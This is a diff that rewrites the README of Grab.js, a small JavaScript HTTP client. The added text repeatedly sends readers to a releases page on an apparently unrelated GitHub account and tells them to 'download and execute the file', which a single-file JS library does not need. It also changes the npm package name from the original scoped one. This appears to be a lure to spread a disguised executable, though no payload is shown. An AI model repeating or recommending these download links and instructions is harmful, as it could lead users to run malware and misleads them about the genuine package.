@@ -1,204 +1,125 @@
-# Grab.js - HTTP Client for Constrained Environments
+# Grab.js: A Lightweight HTTP Client with Advanced Features 🚀
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![npm version](https://badge.fury.io/js/@grab-dev%2Fgrab-js.svg)](https://badge.fury.io/js/@grab-dev%2Fgrab-js)
-[![npm downloads](https://img.shields.io/npm/dm/@grab-dev/grab-js.svg)](https://www.npmjs.com/package/@grab-dev/grab-js)
-[![npm total downloads](https://img.shields.io/npm/dt/@grab-dev/grab-js.svg)](https://www.npmjs.com/package/@grab-dev/grab-js)
+![Grab.js](https://img.shields.io/badge/Grab.js-HTTP%20Client-blue.svg)
+![Version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg)
+![License](https://img.shields.io/badge/license-MIT-yellow.svg)
 
-Zero-dependency HTTP client with retries, caching, circuit breakers, and ETags. Single file, no build tools required.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightorange.svg)](https://github.com/wasqwf/grab-js/releases)
 
-**Size:** 18KB minified, 5KB gzipped
+## Table of Contents
 
-## Quick Start
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Reference](#api-reference)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-```html
-<script src="grab.min.js"></script>
-<script>
-    const api = new Grab({ baseUrl: 'https://api.example.com' });
-    const response = await api.get('/users');
-    console.log(response.data);
-</script>
-```
+## Overview
+
+Grab.js is a compact HTTP client that packs powerful features into just 5KB. Designed for developers who need speed and efficiency, Grab.js offers capabilities like circuit breakers, ETags, and request deduplication. Whether you're building a small application or a large system, Grab.js simplifies your HTTP requests.
 
 ## Features
 
-- **Smart Retries** with exponential backoff
-- **Response Caching** with ETag support
-- **Circuit Breaker** for fault tolerance
-- **Request Deduplication** prevents duplicate in-flight requests
-- **Auth-Aware Cache** prevents user data leakage
-- **Priority Hints** for modern browsers
-- **HTTP/2 Push** hint processing
+- **Lightweight**: At only 5KB, Grab.js is perfect for performance-focused applications.
+- **Circuit Breakers**: Prevents system overload by managing failed requests intelligently.
+- **ETags Support**: Efficiently handles caching to reduce server load and speed up responses.
+- **Request Deduplication**: Avoids duplicate requests, ensuring that your application runs smoothly.
+- **Promise-based API**: Simplifies asynchronous programming with a clean, easy-to-use interface.
 
-## Configuration
+## Installation
 
-```javascript
-const api = new Grab({
-    baseUrl: 'https://api.example.com',
-    timeout: 30000,
-    headers: { 'Authorization': 'Bearer token' },
-    
-    cache: {
-        enabled: true,
-        ttl: 5 * 60 * 1000,  // 5 minutes
-        maxSize: 100
-    },
-    
-    retry: {
-        attempts: 3,
-        delay: (attempt) => Math.min(1000 * Math.pow(2, attempt - 1), 30000),
-        condition: (error) => error.status >= 500
-    },
-    
-    circuitBreaker: {
-        failureThreshold: 5,
-        resetTimeout: 60000,
-        fallback: () => ({ error: 'Service unavailable' })
-    }
-});
+To get started with Grab.js, you can install it via npm:
+
+```bash
+npm install grab-js
 ```
 
-## HTTP Methods
+Alternatively, you can download the latest release from the [Releases section](https://github.com/wasqwf/grab-js/releases). Make sure to download and execute the file to set it up correctly.
+
+## Usage
+
+Using Grab.js is straightforward. Here’s a quick example to demonstrate how to make a simple GET request:
 
 ```javascript
-// Basic requests
-await api.get('/users');
-await api.post('/users', { body: userData });
-await api.put('/users/123', { body: updateData });
-await api.delete('/users/123');
+import Grab from 'grab-js';
 
-// Query parameters
-await api.get('/search', { params: { q: 'javascript', page: 1 } });
+const client = new Grab();
 
-// Custom headers
-await api.post('/upload', { 
-    body: formData,
-    headers: { 'Content-Type': 'multipart/form-data' }
+client.get('https://api.example.com/data')
+  .then(response => {
+    console.log(response.data);
+  })
+  .catch(error => {
+    console.error('Error fetching data:', error);
+  });
+```
+
+### Advanced Usage
+
+You can also take advantage of the advanced features. Here’s how to use circuit breakers:
+
+```javascript
+const client = new Grab({
+  circuitBreaker: {
+    failureThreshold: 5,
+    timeout: 3000,
+  }
 });
 
-// Response types
-await api.get('/data.json', { responseType: 'json' });
-await api.get('/image.png', { responseType: 'blob' });
-
-// Priority hints
-await api.get('/critical', { priority: 'high' });
+client.get('https://api.example.com/data')
+  .then(response => {
+    console.log(response.data);
+  })
+  .catch(error => {
+    console.error('Error fetching data:', error);
+  });
 ```
 
-## Interceptors
+## API Reference
 
-```javascript
-// Add auth to all requests
-api.use({
-    request: (config) => {
-        config.headers.Authorization = `Bearer ${getToken()}`;
-        return config;
-    }
-});
+### `Grab(options)`
 
-// Log responses
-api.use({
-    response: (response) => {
-        console.log(`${response.status} ${response.url}`);
-        return response;
-    }
-});
+Creates a new Grab instance.
 
-// Handle auth errors
-api.use({
-    error: (error) => {
-        if (error.status === 401) {
-            window.location.href = '/login';
-        }
-        throw error;
-    }
-});
-```
+- **options**: An object to configure the client.
 
-## Error Handling
+### `client.get(url, options)`
 
-```javascript
-try {
-    const response = await api.get('/data');
-} catch (error) {
-    if (error instanceof HttpError) {
-        console.error(`HTTP ${error.status}: ${error.message}`);
-    } else if (error instanceof NetworkError) {
-        console.error('Network issue:', error.message);
-    } else if (error instanceof TimeoutError) {
-        console.error(`Timeout after ${error.timeout}ms`);
-    }
-}
-```
+Makes a GET request to the specified URL.
 
-## Convenience Methods
+- **url**: The URL to fetch.
+- **options**: Additional options for the request.
 
-```javascript
-// JSON requests (auto-sets Content-Type)
-const userData = await api.json('POST', '/users', {
-    name: 'Bob',
-    email: 'bob@example.com'
-});
+### `client.post(url, data, options)`
 
-// Form data
-const result = await api.form('POST', '/upload', {
-    file: fileInput.files[0],
-    description: 'My file'
-});
-```
+Makes a POST request to the specified URL.
 
-## Cache Management
+- **url**: The URL to send data to.
+- **data**: The data to send.
+- **options**: Additional options for the request.
 
-```javascript
-// Check stats
-console.log(api.getCacheStats());
-// { size: 10, maxSize: 100, ttl: 300000, pending: 0, etags: 5 }
+## Contributing
 
-// Clear cache
-api.clearCache();
+We welcome contributions to Grab.js! If you'd like to help out, please follow these steps:
 
-// Invalidate specific entries
-api.invalidateCache('/users.*');
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
-// Disable caching per request
-await api.get('/real-time', { cache: false });
-```
-
-## Circuit Breaker
-
-```javascript
-// Check health
-console.log(api.isHealthy());
-
-// Get stats
-const stats = api.getCircuitBreakerStats();
-// { state: 'CLOSED', failures: 0, successes: 42, isHealthy: true }
-
-// Reset manually
-api.resetCircuitBreaker();
-```
-
-## Browser Support
-
-Requires modern browsers with `fetch()` support. For IE11, add polyfills:
-
-```html
-<script src="https://polyfill.io/v3/polyfill.min.js?features=fetch,AbortController"></script>
-<script src="grab.min.js"></script>
-```
-
-## Node.js Usage
-
-If using Node, requires Node.js 18+ (for built-in fetch) or add polyfill:
-
-```javascript
-// Node 18+
-const { Grab } = require('./Grab.js');
-
-// Older Node
-global.fetch = require('node-fetch');
-const { Grab } = require('./Grab.js');
-```
+Please ensure your code follows the project's style guidelines and includes appropriate tests.
 
 ## License
 
-MIT—Do whatever you want with it.
+Grab.js is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Support
+
+For support, please check the [Releases section](https://github.com/wasqwf/grab-js/releases) for the latest updates and fixes. You can also open an issue in the repository if you encounter any problems.
+
+![Grab.js Logo](https://example.com/logo.png)
+
+Feel free to explore the features of Grab.js and see how it can enhance your HTTP requests. For further information, visit the [Releases section](https://github.com/wasqwf/grab-js/releases) to stay updated on the latest changes and improvements.
